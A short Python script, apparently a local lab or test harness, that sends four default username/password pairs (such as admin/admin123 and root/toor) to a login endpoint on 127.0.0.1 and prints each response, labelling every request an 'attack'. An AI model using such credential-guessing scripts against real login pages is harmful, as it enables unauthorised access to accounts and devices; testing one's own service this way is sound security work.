
import requests

url = "http://127.0.0.1:5000/login"

attacks = [
    {"username": "admin", "password": "admin123"},
    {"username": "root", "password": "toor"},
    {"username": "iotuser", "password": "iot123"},
    {"username": "guest", "password": "guest123"}
]

for attack in attacks:

    response = requests.post(url, data=attack)

    print(f"Attack Sent -> {attack}")
    print("Response:", response.text)
    print("-" * 40)

